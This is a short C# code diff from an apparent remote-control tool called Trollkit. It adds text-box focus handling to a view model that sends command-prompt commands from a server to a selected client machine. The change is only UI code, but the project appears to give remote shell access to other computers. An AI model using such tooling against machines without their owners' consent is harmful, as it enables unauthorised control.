@@ -17,8 +17,10 @@ namespace Trollkit_Library.ViewModels.Commands
 
 		public ICommand SendCMD { get { return new SendServerCommand(SendCMDToClient); } }
 		public ICommand Close { get { return new SendServerCommand(CloseCMD); } }
+		public ICommand Focus { get { return new SendServerCommand(FocusOnTextBox); } }
 
 		public string CommandText { get; set; }
+		public bool IsFocusedElement { get; set; }
 
 		public CMDCommands(Server server, string handler)
 		{
@@ -40,5 +42,11 @@ namespace Trollkit_Library.ViewModels.Commands
 			TransferCommandObject returnObject = new TransferCommandObject { Command = "StopCMD", Handler = handler };
 			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
 		}
+
+		public void FocusOnTextBox()
+        {
+			IsFocusedElement = true;
+			_server.UpdateProperty("CMD.IsFocusedElement");
+        }
 	}
 }
